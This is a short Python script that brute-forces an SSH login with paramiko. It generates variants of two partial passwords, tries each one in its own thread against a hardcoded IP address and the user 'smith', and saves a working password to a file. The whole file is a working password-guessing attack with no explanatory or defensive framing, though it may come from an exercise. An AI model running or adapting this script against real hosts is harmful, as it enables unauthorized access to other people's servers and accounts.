import string
import threading
import time
import sys
import paramiko

def generatePasswdList():
    mdp = "QNKruN8"
    mdp2 = "QNKruN9"
    charList = "abcdefghijklmnopqrstuvwxyz"
    slen = len(charList)
    result = []
    # combinations beginning with a character
    for i in range(0, slen):
        concat = mdp + charList[i]
        concat2 = mdp2 + charList[i]
        result.append(concat)
        result.append(concat2)
    for d in range(0, 10):
        concat3 = mdp + str(d)
        concat4 = mdp2 + str(d)
        result.append(concat3)
        result.append(concat4)
    return result

def connect(host, user, passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username=user, password=passwd) 
        f = open('password.txt', 'w')
        f.write(passwd)
        f.close()
        print('connection success !!! password is : ' + passwd)
    except paramiko.AuthenticationException:
        print('login failed with ' + passwd)
    else:
        print('connection succeed !!! password is : ' + passwd)
    ssh.close()
    return

def main():
    passwdList = generatePasswdList()
    print(len(passwdList))
    for i in range(0, len(passwdList)):
        thread = threading.Thread(target=connect, args=("52.10.231.37", "smith", passwdList[i]))
        thread.start()
        time.sleep(2)

    sys.exit(0)

if __name__ == '__main__':
    main()
